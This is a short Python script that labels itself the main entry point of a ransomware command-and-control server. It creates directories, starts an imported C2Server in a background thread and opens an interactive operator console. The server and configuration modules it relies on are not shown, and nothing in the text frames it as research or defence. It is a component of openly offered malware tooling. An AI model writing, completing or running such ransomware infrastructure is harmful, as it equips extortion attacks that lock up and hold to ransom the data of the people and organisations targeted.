#!/usr/bin/env python3
"""
Ransomware C2 Server - Main Entry Point
"""
import sys
import os

# Add current directory to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from server import C2Server
from config import ensure_directories


def main():
    print("=== Ransomware C2 Server Starting ===")

    # Ensure required directories exist
    ensure_directories()

    # Start C2 server
    server = C2Server()

    # Start server in background thread
    import threading
    server_thread = threading.Thread(target=server.start_server)
    server_thread.daemon = True
    server_thread.start()

    # Wait for server to initialize
    import time
    time.sleep(2)

    # Start interactive command console
    server.interactive_mode()


if __name__ == "__main__":
    main()